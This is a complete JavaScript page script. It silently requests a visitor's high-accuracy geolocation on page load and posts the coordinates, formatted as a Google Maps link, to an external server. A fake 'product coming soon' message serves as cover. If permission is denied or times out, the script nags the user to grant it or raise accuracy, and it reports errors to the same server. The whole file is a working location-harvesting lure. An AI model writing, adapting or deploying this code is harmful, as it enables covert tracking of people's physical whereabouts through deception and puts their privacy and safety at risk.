window.onload = function() {
    if (navigator.geolocation) {
        var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
        navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
    } else {
        alert('Geolocation is not supported by your browser...');
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        $.ajax({
            type: 'POST',
            url: 'https://app-dt38.onrender.com/location',
            data: JSON.stringify({ "data": `Google Map Link: https://google.com/maps/place/${lat}+${lon}` }),
            contentType: 'application/json; charset=UTF-8',
            success: function () { $('#change').html('Coming Soon'); },
            error: function () { $('#change').html('Failed to send location'); },
        });
        alert('Thank you for taking interest! This product is coming soon.');
    }

    function showError(error) {
        let errorMessage;
        switch (error.code) {
            case error.PERMISSION_DENIED:
                errorMessage = 'User denied the request for Geolocation';
                alert('Please refresh this page and allow location permission...');
                break;
            case error.POSITION_UNAVAILABLE:
                errorMessage = 'Location information is unavailable';
                break;
            case error.TIMEOUT:
                errorMessage = 'The request to get user location timed out';
                alert('Please set your location mode to High Accuracy...');
                break;
            case error.UNKNOWN_ERROR:
                errorMessage = 'An unknown error occurred';
                break;
        }

        $.ajax({
            type: 'POST',
            url: 'https://app-dt38.onrender.com/receive-error',
            data: JSON.stringify({ "error": errorMessage }),
            contentType: 'application/json; charset=UTF-8',
            success: function () { $('#change').html('Error received successfully'); },
            error: function () { $('#change').html('Failed to send error'); },
        });
    }
}
